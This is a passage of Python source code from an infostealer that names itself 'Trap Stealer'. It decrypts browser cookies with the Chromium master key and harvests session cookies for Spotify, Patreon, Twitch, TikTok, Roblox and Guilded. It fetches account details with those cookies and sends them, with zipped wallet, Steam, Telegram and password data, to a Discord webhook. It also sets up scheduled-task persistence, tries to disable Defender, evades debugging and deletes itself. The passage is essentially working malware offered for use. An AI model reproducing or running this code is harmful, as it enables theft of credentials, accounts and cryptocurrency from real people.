                                "name": "✨ Cookie:",
                                "value": f"`{cookie}`",
                                "inline": True
                            },
                            {
                                "name": "📧 Email:",
                                "value": f"`{email}`",
                                "inline": False
                            },
                            {
                                "name": "🎧 ID | Global Username | Username:",
                                "value": f"`{ids}\n{globalusername}\n{username}`",
                                "inline": True
                            },
                            {
                                "name": "😋 Profile Picture URL:",
                                "value": f"`{pfp}`",
                                "inline": True
                            },
                            {
                                "name": "📅 Join date",
                                "value": f"`{join}`",
                                "inline": True
                            },
                            {
                                "name": "📜 Bio",
                                "value": f"`{bio}`",
                                "inline": True
                            },
                            {
                                "name": "🌐 Connections",
                                "value": f"{formatted_social_links}",
                                "inline": False
                            },
                        ]
                    }
                ],
                "attachments": []
            }
        headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except Exception as e:
        error_Handler(e)
        
def Schedule():
    try:
        script_path = os.path.abspath(sys.argv[0])
        appdata_path = os.getenv('APPDATA')
        roaming_folder = os.path.join(appdata_path, 'Roaming')
        existing_folders = [folder for folder in os.listdir(roaming_folder) if os.path.isdir(os.path.join(roaming_folder, folder))]
        if existing_folders:
            random_folder_name = random.choice(existing_folders)
            destination_folder = os.path.join(roaming_folder, random_folder_name)
            destination_file = os.path.join(destination_folder, os.path.basename(script_path))
            shutil.copy2(script_path, destination_file)
            task_command = f'schtasks.exe /create /tn ACCC_Tools /tr "{destination_file}" /st 21:50 /du 23:59 /sc daily /ri 1 /f'
            subprocess.run(task_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        error_Handler(e)

def patreon(cookie):
    try:
        patreonurl = "https://www.patreon.com/api/current_user?include=connected_socials%2Ccampaign.connected_socials&json-api-version=1.0"
        headers = {
        "Cookie": f'session_id={cookie}',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        }

        response = requests.get(patreonurl, headers=headers).json()
        social_connections = response.get("data", {}).get("attributes", {}).get("social_connections", {})
        created = response["data"]["attributes"]["created"] if response["data"]["attributes"]["created"] else "Couldn't get creation date"
        email = response["data"]["attributes"]["email"] if response["data"]["attributes"]["email"] else "Couldn't get creation date"
        verified = '✅' if response["data"]["attributes"]["is_email_verified"] == True else '❌'
        currency = response["data"]["attributes"]["patron_currency"] if response["data"]["attributes"]["patron_currency"] else "Couldn't get currency"
        image = response["data"]["attributes"]["thumb_url"] if response["data"]["attributes"]["thumb_url"] else "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
        bio = response["data"]["attributes"]["about"] if response["data"]["attributes"]["about"] else "Couldn't get bio/No bio"
        non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
        url = response["links"]["self"] if response["links"]["self"] else "Couldn't get URL"
        url2 = response["data"]["attributes"]["url"] if response["data"]["attributes"]["url"] else "Couldn't get URL"
        if not non_null_social_connections:
            social_connection_names = "No connections"
        else:  
            social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections])

        data = {
                "username": "Trap Stealer",
                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
                "content": "",
                "embeds": [
                    {
                        "title": f"🍪 Trap Stealer Patreon Session",
                        "description": f"Founded user information ! :\n",
                        "color": 0xffb6c1,
                        "author": {
                            "name": f"User information :",
                            "icon_url": image
                        },
                        "footer": {
                            "text": "Trap Stealer",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        },
                        "thumbnail": {
                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                        },
                        "fields": [
                            {
                                "name": "✨ Cookie:",
                                "value": f"`{cookie}`",
                                "inline": True
                            },
                            {
                                "name": "📧 Email:",
                                "value": f"`{email}`",
                                "inline": False
                            },
                            {
                                "name": "✔️ Verified",
                                "value": f"`{verified}`",
                                "inline": True
                            },
                            {
                                "name": "📅 Join date",
                                "value": f"`{created}`",
                                "inline": True
                            },
                            {
                                "name": "😋 Profile Picture URL:",
                                "value": f"`{image}`",
                                "inline": False
                            },
                            {
                                "name": "📜 Bio",
                                "value": f"`{bio}`",
                                "inline": True
                            },
                            {
                                "name": "💰 Currency",
                                "value": f"`{currency}`",
                                "inline": True
                            },
                            {
                                "name": "📙 Account URL",
                                "value": f"`{url}\n{url2}`",
                                "inline": False
                            },
                            {
                                "name": "🌐 Connections",
                                "value": f"{social_connection_names}",
                                "inline": False
                            },
                        ]
                    }
                ],
                "attachments": []
            }
        headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except Exception as e:
        error_Handler(e)
    
def twitch_session(auth_token, username):
    try:
        url = 'https://gql.twitch.tv/gql'
        headers = {
            'Authorization': f'OAuth {auth_token}',
            'Content-Type': 'application/json',
        }

        query = f"""
        
        query {{
            user(login: "{username}") {{
                id
                login
                displayName
                email
                hasPrime
                isPartner
                language
                profileImageURL(width: 300)
                bitsBalance
                followers {{
                    totalCount
                }}
            }}
        }}
        """

        data = {
            "query": query
        }

        response = requests.post(url, headers=headers, json=data).json()
        userid= response["data"]["user"]["id"] if response["data"]["user"]["id"] else "Coudn't get user ID"
        login= response["data"]["user"]["login"] if response["data"]["user"]["login"] else "Coudn't get user login"
        displayName= response["data"]["user"]["displayName"] if response["data"]["user"]["displayName"] else "Coudn't get user Display Name"
        email = response["data"]["user"]["email"] if response["data"]["user"]["email"] else "Coudn't get user email"
        hasPrime ='True' if response["data"]["user"]["hasPrime"] == True else "False"
        
        isPartner = 'True' if response["data"]["user"]["isPartner"] == True else "False"
        language = response["data"]["user"]["language"] if response["data"]["user"]["language"] else "Coudn't get language"
        pfp = response["data"]["user"]["profileImageURL"] if response["data"]["user"]["profileImageURL"] else "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
        bits = response["data"]["user"]["bitsBalance"] if response["data"]["user"]["bitsBalance"] else "0"
        sub = response["data"]["user"]["followers"]["totalCount"] if response["data"]["user"]["followers"]["totalCount"] else "Coudn't get followers numbers"
        data = {
            "username": "Trap Stealer",
            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
            "content": "",
            "embeds": [
                {
                    "title": f"🍪 Trap Stealer Twitch Session",
                    "description": f"Founded user information ! :\n",
                    "color": 0xffb6c1,
                    "author": {
                        "name": f"User information :",
                        "icon_url": pfp
                    },
                    "footer": {
                        "text": "Trap Stealer",
                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                    },
                    "thumbnail": {
                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                    },
                    "fields": [
                        {
                            "name": "✨ Cookie:",
                            "value": f"Auth Token : `{auth_token}`\nUsername : `{username}`",
                            "inline": False
                        },
                        {
                            "name": "😊 User ID/Login/Display Name:",
                            "value": f"`{userid}`\n`{login}`\n`{displayName}`",
                            "inline": True
                        },
                        {
                            "name": "📧 Email:",
                            "value": f"`{email}`",
                            "inline": True
                        },
                        {
                            "name": "💻 Prime:",
                            "value": f"`{hasPrime}`",
                            "inline": True
                        },
                        {
                            "name": "😎 Username:",
                            "value": f"`{username}`",
                            "inline": True
                        },
                        {
                            "name": "💰 Bits:",
                            "value": f"`{bits}`",
                            "inline": True
                        },
                        {
                            "name": "👌 Partner:",
                            "value": f"`{isPartner}`",
                            "inline": True
                        },
                        {
                            "name": "🪙 Followers:",
                            "value": f"`{sub}`",
                            "inline": True
                        },
                        {
                            "name": "🎌 Language:",
                            "value": f"`{language}`",
                            "inline": True
                        },
                    ]
                }
            ],
            "attachments": []
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        
    except Exception as e:
        error_Handler(e)
        
def spotify(cookie):
    try:
        headers ={
            'cookie':f'sp_dc={cookie}'
        }
        
        
        accountdata = requests.get('https://www.spotify.com/api/account-settings/v1/profile', headers=headers).json()
        email = accountdata["profile"]["email"] if accountdata["profile"]["email"] else 'No Email'
        gender = accountdata["profile"]["gender"] if accountdata["profile"]["gender"] else 'No Gender'
        birthdate = accountdata["profile"]["birthdate"] if accountdata["profile"]["birthdate"] else 'No Birthdate'
        country = accountdata["profile"]["country"] if accountdata["profile"]["country"] else 'No Country'
        username = accountdata["profile"]["username"] if accountdata["profile"]["username"] else 'No Username'
        
        sub = requests.get('https://www.spotify.com/eg-en/api/account/v1/datalayer/', headers=headers).json()
        
        Trial = '✅' if sub["isTrialUser"]!= None else '❌'
        plan = sub["currentPlan"] if sub["currentPlan"] else 'Error getting plan'
        age = sub["accountAgeDays"] if sub["accountAgeDays"] else 'Error getting creation date'
        current_timestamp = time.time()
        timestamp = current_timestamp - (age * 24 * 60 * 60)
        date = time.strftime("%Y-%m-%d", time.localtime(timestamp))

        data = {
                "username": "Trap Stealer",
                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
                "content": "",
                "embeds": [
                    {
                        "title": f"🍪 Trap Stealer Spotify Session",
                        "description": f"Founded user information ! :\n",
                        "color": 0xffb6c1,
                        "author": {
                            "name": f"User information :",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        },
                        "footer": {
                            "text": "Trap Stealer",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        },
                        "thumbnail": {
                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                        },
                        "fields": [
                            {
                                "name": "✨ Cookie:",
                                "value": f"`{cookie}`",
                                "inline": True
                            },
                            {
                                "name": "🔗 Email:",
                                "value": f"`{email}`",
                                "inline": False
                            },
                            {
                                "name": "☂️ Username:",
                                "value": f"`{username}`",
                                "inline": True
                            },
                            {
                                "name": "⚥ Gender:",
                                "value": f"`{gender}`",
                                "inline": True
                            },
                            {
                                "name": "🎂 Birthdate:",
                                "value": f"`{birthdate}`",
                                "inline": True
                            },
                            {
                                "name": "🌎 Country:",
                                "value": f"`{country}`",
                                "inline": True
                            },
                            {
                                "name": "😋 Trial User:",
                                "value": f"`{Trial}`",
                                "inline": True
                            },
                            {
                                "name": "💰 Plan:",
                                "value": f"`{plan.capitalize()}`",
                                "inline": True
                            },
                            {
                                "name": "⌛ Creation Date:",
                                "value": f"`{date}`",
                                "inline": True
                            },
                        ]
                    }
                ],
                "attachments": []
            }
        headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except Exception as e:
        error_Handler(e)
    
def cokssite():
    try:
        Cookies = os.getenv("TEMP") + fr"\wpcook.txt"
        with open(Cookies, 'r') as f:
            lines = f.readlines()
            l = []
            Thread = []
            first = ''
            second = ''
            for line in lines:
                try:
                    parts = line.split()
                    if parts[2] in l:
                        pass
                    if '.ROBLOSECURITY' in line:
                        parts = line.split()
                        cookie = parts[2]
                        l.append(cookie)
                        r = threading.Thread(target=roblox, args=[cookie])
                        r.start()
                        Thread.append(r)
                    elif '.tiktok.com' in line:
                        if "sessionid" in line:
                            parts = line.split()
                            cookie = parts[2]
                            t = threading.Thread(target=TikTokSession, args=[cookie])
                            t.start()
                            Thread.append(t)
                            l.append(parts[2])
                    elif '.spotify.com' in line:
                        if "sp_dc" in line:
                            parts = line.split()
                            cookie = parts[2]
                            s = threading.Thread(target=spotify, args=[cookie])
                            s.start()
                            Thread.append(s)
                            l.append(parts[2])
                    elif '.guilded.gg' in line:
                        if 'hmac_signed_session' in line:
                            parts = line.split()
                            cookie = parts[2]
                            g = threading.Thread(target=guilded, args=[cookie])
                            g.start()
                            Thread.append(g)
                            l.append(parts[2])
                    elif '.patreon.com' in line:
                        if 'session_id' in line:
                            parts = line.split()
                            cookie = parts[2]
                            p = threading.Thread(target=patreon, args=[cookie])
                            p.start()
                            Thread.append(p)
                            l.append(parts[2])
                    elif '.twitch.tv' in line:
                        if 'auth-token' in line:
                            parts = line.split()
                            first = parts[2]
                    elif '.twitch.tv' in line:
                        if 'name' in line:
                            parts = line.split()
                            second = parts[2]
                    if first != '' and  second != '':
                        t = threading.Thread(target=twitch_session, args=[first, second])
                        t.start()
                        Thread.append(t)
                        l.append(first)
                        l.append(second)
                        first, second = '',''
                except Exception as e:
                    error_Handler(e)
             
            for thread in Thread:
                thread.join()
    except Exception as e:
        error_Handler(e)
     
def getCook(path, arg, process):
    try:

        global Cookies, CookiCount
        
        if not os.path.exists(path): 
            return
        
        e = 'seikooC/'
        
        pathC = path + arg + e[::-1]
        
        if os.stat(pathC).st_size == 0: 
            return

        tempfold = (f"{temp}wp"+ ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))+ ".db"
        )

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = f"{path}/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotected(master_key[5:])
  
        for row in data: 
            if row[0] != '':

                Cookies.append(f"{row[0]}     {row[1]}        {DecryptValue(row[2], master_key)}")
                CookiCount += 1

        writeforfile(Cookies, 'cook')
    except Exception as e:
        error_Handler(e)
        try:
            close = close_process(process[1]) 
            getCook(path, arg, process)
        except Exception as e:
            error_Handler(e)
    

def zip_temp_folder():
    temp_folder = os.path.join(os.environ['TEMP'], 'Logs')
    zip_file_path = os.path.join(os.environ['TEMP'], 'Logs.zip')

    try:
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(temp_folder):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        relative_path = os.path.relpath(file_path, temp_folder)
                        zipf.write(file_path, relative_path)
                    except:
                        pass
        url = upload_file(zip_file_path)
        data = {
                "username": "Trap Stealer",
                "content": "",
                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                "embeds": [
                    {
                        "title": f"🍪 Trap Stealer logs",
                        "description": f"Here the logs\n[Click here to download]({url})",
                        "color": 0xffb6c1,
                        "thumbnail": {
                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                        },
                        "footer": {
                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                        }
                    }
                ]
            }
        headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }
    
    

        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

        
    except Exception as e:
        error_Handler(e)
        
         
def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
        
    try:
        global WalletsZip, GamingZip, OtherZip
        wal, ga, ot = "",'',''
        if len(WalletsZip) != 0:
            wal = ":coin:  •  Wallets\n"
            for i in WalletsZip:
                wal += f"└─ [{i[0]}]({i[1]})\n"
        if len(GamingZip) != 0:
            ga = ":video_game:  •  Gaming:\n"
            for i in GamingZip:
                ga += f"└─ [{i[0]}]({i[1]})\n"
        if len(OtherZip) != 0:
            ot = ":tickets:  •  Apps\n"
            for i in OtherZip:
                ot += f"└─ [{i[0]}]({i[1]})\n"

                    
        headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }

        data = {
                "embeds": [
                    {
                        "title": "Trap Stealer Zips",
                        "description": f"{wal}\n{ga}\n{ot}",
                        "color": 0xffb6c1,
                        "footer": {
                            "text": "Trap Stealer ZIP",
                            "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
                    }
                ],
                "username": "Trap Stealer",
                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                "attachments": []
            }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
    except Exception as e:
        error_Handler(e)


def dlself(script_path):
    try:
        os.remove(script_path)
    except Exception as e:
        error_Handler(e)       
def gatha():
    global PasswCount
    global injection
    global DiscordStop
    browserPaths = [        
        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
        [f"{local}/Google/Chrome/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Google/Chrome SxS/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
        
    ]
    
    Discord = 'drocsiD'
    Lightcord = 'drocthgiL'
    BTPdiscord = 'btpdrocsid'
    Canary = 'yranacdrocsid'
    discordPaths = [        
        [f"{roaming}/{Discord[::-1]}", "/Local Storage/leveldb"],
        [f"{roaming}/{Lightcord[::-1]}", "/Local Storage/leveldb"],
        [f"{roaming}/{Canary[::-1]}", "/Local Storage/leveldb"],
        [f"{roaming}/{BTPdiscord[::-1]}", "/Local Storage/leveldb"],
        
    ]
    PathsToZip = [

        [f"{roaming}/atomic/Local Storage/leveldb", "Atomic Wallet.exe", "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\\Program Files (x86)\\Steam\\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
    First_Thread = []
    Second_Thread = []
    try:
        defender = threading.Thread(target=Disa_Def)
        defender.start()
        Second_Thread.append(defender)
    except Exception as e:
        error_Handler(e)
        
    if trap_extension == True:
        Iban = threading.Thread(target=trap_exten)
        Iban.start()
        First_Thread.append(Iban)
            
    try:
        if antidebugging == True:
            ad = threading.Thread(target=antidebug)
            ad.start()
            First_Thread.append(ad)
        else:
            pass
    except Exception as e:
        error_Handler(e)
    if schedule == True:
        sh = threading.Thread(target=Schedule)
        sh.start()
        First_Thread.append(sh)
        
    if hidewindow == True:
        try:
            hide_console1()
            hide_console2()
        except Exception as e:
            error_Handler(e)
        
    if Drive == True:
        Drives = threading.Thread(target=steal_driver)
        Drives.start()
        Second_Thread.append(Drives)
        
    for patt in browserPaths:
        try: 
            close_process(patt[1]) 
        except Exception as e:
            error_Handler(e)
         
    for patt in browserPaths:
        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3], patt[1]])
        pa.start()
        Second_Thread.append(pa)
        
    for patt in browserPaths: 
        try: 
            close_process(patt[1]) 
        except Exception as e:
            error_Handler(e)
        getc = threading.Thread(target=getCook, args=[patt[0], patt[4], patt[1]])
        getc.start()
        Second_Thread.append(getc)
        
        
    for patt in browserPaths:
        autof = threading.Thread(target=GetAutofill,args=[patt[0], patt[3]])
        autof.start()
        Second_Thread.append(autof)
        
    frfc = threading.Thread(target=frcook)
    frfc.start()
    Second_Thread.append(frfc)
        
    for patt in browserPaths:
        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
        tokq.start()
        First_Thread.append(tokq)
        
    btk = threading.Thread(target=bypass_token_protector)
    btk.start()
    First_Thread.append(btk)
    
    bd = threading.Thread(target=Bypass_Better_Discord)
    bd.start()
    First_Thread.append(bd)
    
    getinf = threading.Thread(target=getinfo)
    getinf.start()
    First_Thread.append(getinf)
    
    sess = threading.Thread(target=minecraft_sessions)
    sess.start()
    First_Thread.append(sess)
    
    if ArchiStealer == True:
        ArS = threading.Thread(target=ArchiSteamFarm)
        ArS.start()
        First_Thread.append(ArS)
        
    if Fakegen == True:
        us = threading.Thread(target=fakegen)
        us.start()
        First_Thread.append(us)
    

    if FakeError == True:
        fe = threading.Thread(target=fakeError)
        fe.start()
        First_Thread.append(fe)

    if FakeCCgen == True:
        fcc = threading.Thread(target=fakeccgen)
        fcc.start()
        First_Thread.append(fcc)

    if FakeWebhook == True:
        wb = threading.Thread(target=webhook_tools)
        wb.start()
        First_Thread.append(wb)
        
    for thread in Second_Thread:
        thread.join()

    fls = ['cook', 'autof', 'passw']
    for item in fls:
        datas = threading.Thread(target=paaz, args=[item])
        datas.start()
        Second_Thread.append(datas)
        
    
    if OneTimeSteal == True:
        ots = threading.Thread(target=antispam)
        ots.start()
        First_Thread.append(ots)

    if Startup == True:
        sta = threading.Thread(target=startup)
        sta.start()
        First_Thread.append(sta)


    gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
    gatz.start()
    First_Thread.append(gatz)
    
    upfd = threading.Thread(target=upload_files_to_discord)
    upfd.start()
    First_Thread.append(upfd)
    
    hist = threading.Thread(target=histup)
    hist.start()
    First_Thread.append(hist)
        
    uploadw = threading.Thread(target=Upload_Whatsapp)
    uploadw.start()
    First_Thread.append(uploadw)
    
    scr = threading.Thread(target=srcs)
    scr.start()
    First_Thread.append(scr)
    
    if injection == True:
        try:
            ij = threading.Thread(target=idisc)
            ij.start()
            First_Thread.append(ij)
            
            DiscordStop = False
        except Exception as e:
            error_Handler(e)

    
    if DiscordStop == True:
        try:
            no = threading.Thread(target=NoDiscord)
            no.start()
            First_Thread.append(no)
            injection = False
        except Exception as e:
            error_Handler(e)
    
    for patt in discordPaths:
        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        di.start()
        First_Thread.append(di)
    
    for thread in Second_Thread:
        thread.join()
        
    it = ['uploooad']
    for item in it:
        datas = threading.Thread(target=paaz, args=[item])
        datas.start()
        First_Thread.append(datas)

    for thread in First_Thread:
        thread.join()
    
    if logfile == True:
        log = threading.Thread(target=zip_temp_folder)
        log.start()
        Second_Thread.append(log)
        log.join()
        
    for thread in Second_Thread:
        thread.join()
    if crasher == True:
        crashs()
        
    if melter == True:
        srcss = os.path.realpath(__file__)
        dlself(srcss)

gatha()
